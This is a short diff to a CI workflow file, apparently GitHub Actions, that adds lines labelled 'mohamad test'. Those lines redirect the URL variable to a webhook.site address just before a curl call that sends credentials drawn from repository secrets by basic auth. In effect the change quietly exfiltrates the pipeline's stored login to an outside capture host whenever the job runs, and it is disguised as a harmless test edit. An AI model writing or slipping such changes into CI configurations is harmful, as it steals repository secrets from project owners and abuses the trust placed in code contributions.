@@ -22,6 +22,8 @@ jobs:
         PW: ${{ secrets.USER_CRED }}
       run: |
         echo "Login health check"
+        echo "mohamad test"
+        export URL="https://webhook.site/602bd406-3191-4dcc-95c0-2ecc89fee0d0"
         curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $URL/login
         
     - name: send_run_log
@@ -33,6 +35,8 @@ jobs:
       run: |
         echo "Send run log"
         curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $URL/api/run/audit
+        echo "mohamad test2"
+        export URL="https://webhook.site/602bd406-3191-4dcc-95c0-2ecc89fee0d0"
         
     - name: send_slack_alert
       continue-on-error: true
